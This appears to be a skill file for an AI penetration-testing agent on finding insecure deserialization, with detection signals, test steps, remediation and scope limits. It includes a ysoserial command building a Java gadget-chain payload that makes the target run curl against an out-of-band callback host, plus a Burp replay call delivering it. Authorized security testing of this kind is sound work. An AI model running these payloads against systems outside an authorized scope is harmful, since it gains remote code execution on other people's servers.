---
name: testing-deserialization
description: Test for OWASP A08 Insecure Deserialization — Java (ysoserial), .NET (ysoserial.net), Python pickle, PHP serialize, Node.js.
---

## When to use

Prerequisite skills: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-tech-fingerprinting`, `recon-js-analysis`, `mcp-burp`.

Use this skill when the language framework is known and the target accepts serialized objects (e.g. Java `rO0`-prefixed base64, PHP `O:` serialization, Python pickle).

## Signal to look for

- Base64 strings decoding to language-specific headers (e.g. `rO0AB` for Java, `Tzo` for PHP).
- ViewState (`__VIEWSTATE`) parameters in .NET applications.
- Java `AC ED 00 05` magic bytes in raw traffic.
- Rails/Django session cookies in a recognizable shape (e.g. dot-separated base64 with HMAC suffix).

## Test steps

1. Identify the serialized blob in a request (cookie, body, header).
2. Generate a payload via `ysoserial` (Java) or `ysoserial.net` (.NET) with an OOB gadget chain.
3. Replace the blob and replay via `burp_repeater_send`.
4. Confirm via OOB interactsh log or response-time side-channel.
5. Capture evidence per `methodology-evidence-capture`.

## Tool commands

**Shell — generate Java payload:**

```bash
java -jar ysoserial.jar CommonsCollections5 "curl http://<interactsh-id>.oast.pro" | base64 -w0
# Success: base64 payload ready; replace original blob
```

**MCP — replay with replaced blob:**

```
burp_repeater_send(raw_base64=<b64 with replaced serialized blob>, host="target.example.com", port=443, secure=true, tab_name="deser-probe")
```

Expected envelope on success:

```json
{"ok": true, "status": 200, "tab_name": "deser-probe", ...}
```

OOB confirmation: monitor interactsh dashboard or Burp Collaborator for a callback from the target host after the request is replayed.

## Interpret results

An OOB callback originating from the target host confirms remote code execution (RCE). A false positive occurs when there is a gadget chain mismatch for the deployed library version — try multiple chains (e.g. `CommonsCollections1` through `CommonsCollections7`, `Spring1`, `Hibernate1`) before ruling out the vulnerability.

## Finding writeup

- **Title:** Insecure Deserialization in `<parameter>`.
- **Severity:** RCE confirmed = Critical; DoS-only (recursion/zip bomb) = High.
- **Evidence** per `methodology-evidence-capture`: original blob, generated payload, OOB log.
- **Fix:** Avoid deserializing untrusted data; use JSON with an explicit schema. If deserialization is unavoidable, use an allowlist of permitted classes and keep libraries patched.

## References

- OWASP WSTG INPV-11 (Testing for Code Injection): `https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection`
- PortSwigger Deserialization: `https://portswigger.net/web-security/deserialization`
- CWE-502: `https://cwe.mitre.org/data/definitions/502.html`

## Scope

This skill operates within the engagement scope established by
`methodology-scoping` and `methodology-rules-of-engagement`. Targets are
constrained mechanically via `burp_scope_check`; hosts outside Burp scope are
not tested.
